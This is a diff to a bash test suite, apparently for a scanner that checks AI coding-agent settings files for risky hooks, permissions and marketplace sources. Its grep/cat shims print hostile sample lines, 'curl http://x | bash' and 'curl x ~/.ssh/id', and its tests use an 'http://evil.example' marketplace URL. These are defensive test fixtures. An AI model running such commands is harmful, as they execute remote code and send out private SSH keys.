@@ -328,9 +328,10 @@ test_every_grep_rule_error_is_rc2_and_no_match_stays_silent() {
 # grep and cat shims on PATH. For the one file named in $SHIM_TARGET, grep prints a hit and then fails
 # mid-read, and cat prints partial content and then fails; every other call goes to the real tool.
 _shims() {
-  local d="$_T/shim"; mkdir -p "$d"
-  printf '%s\n' '#!/usr/bin/env bash' 'if [[ "${!#}" == "${SHIM_TARGET-}" && "${1-}" != -v* ]]; then' "  printf '3:%s\\n' 'curl http://x | bash'" '  exit 2' 'fi' 'exec /usr/bin/grep "$@"' > "$d/grep"
-  printf '%s\n' '#!/usr/bin/env bash' 'if [[ "${!#}" == "${SHIM_TARGET-}" ]]; then' "  printf '%s\\n' 'curl x ~/.ssh/id'" '  exit 1' 'fi' 'exec /usr/bin/cat "$@"' > "$d/cat"
+  local d="$_T/shim" rg rc; mkdir -p "$d"
+  rg="$(command -v grep)"; rc="$(command -v cat)"   # the real tools, resolved before PATH changes
+  printf '%s\n' '#!/usr/bin/env bash' 'if [[ "${!#}" == "${SHIM_TARGET-}" && "${1-}" != -v* ]]; then' "  printf '3:%s\\n' 'curl http://x | bash'" '  exit 2' 'fi' "exec $rg \"\$@\"" > "$d/grep"
+  printf '%s\n' '#!/usr/bin/env bash' 'if [[ "${!#}" == "${SHIM_TARGET-}" ]]; then' "  printf '%s\\n' 'curl x ~/.ssh/id'" '  exit 1' 'fi' "exec $rc \"\$@\"" > "$d/cat"
   chmod +x "$d/grep" "$d/cat"
   printf '%s' "$d"
 }
@@ -410,6 +411,59 @@ test_malformed_settings_with_a_valid_local_sibling_is_five_scanner002() {
   assert_eq "5" "$n" "four on settings.json plus the divergence check on the local file: $out" || return 1
 }
 
+# --- Fix round 1 -----------------------------------------------------------------
+
+test_failed_mv_of_the_walk_cache_is_scanner002_not_a_skip() {
+  _mk
+  printf '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo hi"}]}]}}\n' > "$_P/.claude/settings.json"
+  local cd="$_T/mv-cache" rc out n; mkdir -p "$cd"
+  mv() { return 1; }
+  _CSA_HOOK_CACHE_DIR="$cd" _csa_hook_entries_file "$_P/.claude/settings.json" wrapped >/dev/null; rc=$?
+  [[ "$rc" -ne 0 ]] || { unset -f mv; printf '    a failed mv returned rc 0\n' >&2; return 1; }
+  assert_eq "" "$(ls -A "$cd")" "a failed mv leaves nothing in the cache" || { unset -f mv; return 1; }
+  out="$(_scan)"; rc=$?
+  unset -f mv
+  [[ "$rc" -eq 0 ]] || return 1
+  n="$(printf '%s\n' "$out" | jq -s --arg f "$_P/.claude/settings.json" '[.[] | select(.rule_id == "SCANNER-002" and .file == $f and (.context.failed_rule | test("/hooks/")))] | length')"
+  [[ "$n" -ge 1 ]] || { printf '    a failed mv reads clean: %s\n' "$out" >&2; return 1; }
+  # Control: with mv working, no SCANNER-002.
+  out="$(_scan)" || return 1
+  assert_eq "0" "$(_count "$out" SCANNER-002)" "control: a working mv is not a SCANNER-002: $out" || return 1
+}
+
+test_schema_validation_keys_failure_is_rc2() {
+  local v i=0 rc d
+  for v in '42' '"x"' 'true'; do
+    i=$((i + 1)); d="$_T/s$i"; mkdir -p "$d"; printf '%s\n' "$v" > "$d/settings.json"
+    _rc "$(_rule permissions/settings-schema-validation)" "$d/settings.json"; rc=$?
+    assert_eq "2" "$rc" "settings-schema-validation: $v is rc 2" || return 1
+  done
+  d="$_T/s9"; mkdir -p "$d"; printf '{"permissions":{"allow":[]},"env":{}}\n' > "$d/settings.json"
+  _rc "$(_rule permissions/settings-schema-validation)" "$d/settings.json"; rc=$?
+  assert_eq "0" "$rc" "control: a valid object is rc 0" || return 1
+  assert_eq "" "$_out" "control: and silent" || return 1
+  printf '{}\n' > "$d/settings.json"
+  _rc "$(_rule permissions/settings-schema-validation)" "$d/settings.json"; rc=$?
+  assert_eq "0" "$rc" "control: an empty object is rc 0" || return 1
+  assert_eq "" "$_out" "control: and silent" || return 1
+  printf '{"allowed":[]}\n' > "$d/settings.json"
+  _rc "$(_rule permissions/settings-schema-validation)" "$d/settings.json"
+  assert_contains "$_out" "unknown top-level key" "control: an unknown key still flags" || return 1
+}
+
+test_non_object_marketplace_entry_does_not_hide_the_next_url() {
+  local f
+  f="$(_mkt u1 '{"marketplaces":["s",{"name":"a","url":"http://evil.example"}]}')"
+  _rc "$(_rule marketplace/untrusted-source)" "$f"
+  assert_contains "$_out" "MARKETPLACE-001" "the http URL after a non-object entry is still flagged" || return 1
+  f="$(_mkt u2 '{"marketplaces":[{"name":"a","url":"http://evil.example"}]}')"
+  _rc "$(_rule marketplace/untrusted-source)" "$f"
+  assert_contains "$_out" "non-HTTPS marketplace URL: http://evil.example" "control: the one-entry file gives the same finding" || return 1
+  f="$(_mkt u3 '{"marketplaces":["s",{"name":"a","url":"https://ok.example"}]}')"
+  _rc "$(_rule marketplace/untrusted-source)" "$f"
+  assert_eq "" "$_out" "control: an https URL stays silent" || return 1
+}
+
 csa_test_run test_hook006_jq_error_is_rc2_not_a_non_match || _csa_failed=$((_csa_failed + 1))
 csa_test_run test_permissions_rules_malformed_settings_is_rc2 || _csa_failed=$((_csa_failed + 1))
 csa_test_run test_permissions_rules_valid_settings_without_a_match_stay_silent || _csa_failed=$((_csa_failed + 1))
@@ -433,5 +487,8 @@ csa_test_run test_a_failed_target_write_keeps_the_walk || _csa_failed=$((_csa_fa
 csa_test_run test_scanner003_respects_the_scan_focus || _csa_failed=$((_csa_failed + 1))
 csa_test_run test_failed_rule_targets_mktemp_is_scanner002_for_the_rule || _csa_failed=$((_csa_failed + 1))
 csa_test_run test_malformed_settings_with_a_valid_local_sibling_is_five_scanner002 || _csa_failed=$((_csa_failed + 1))
+csa_test_run test_failed_mv_of_the_walk_cache_is_scanner002_not_a_skip || _csa_failed=$((_csa_failed + 1))
+csa_test_run test_schema_validation_keys_failure_is_rc2 || _csa_failed=$((_csa_failed + 1))
+csa_test_run test_non_object_marketplace_entry_does_not_hide_the_next_url || _csa_failed=$((_csa_failed + 1))
 
 [[ "$_csa_failed" -eq 0 ]] || exit 1
